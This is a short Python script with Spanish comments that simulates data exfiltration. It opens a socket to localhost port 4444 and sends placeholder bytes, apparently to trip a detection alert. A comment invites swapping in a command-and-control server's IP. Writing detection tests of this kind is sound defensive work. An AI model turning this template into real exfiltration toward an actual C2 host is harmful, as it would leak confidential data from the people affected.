import socket

def simulate_exfiltration():
    target_ip = "127.0.0.1" # Cambiar por la IP del C2
    target_port = 4444
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendall(b"INFO_CONFIDENCIAL_EXFILTRADA")
        print("[*] Datos enviados al puerto 4444")
        s.close()
    except Exception as e:
        print(f"[!] Error: {e} (La alerta se dispara igual por el intento)")

if __name__ == "__main__":
    simulate_exfiltration()
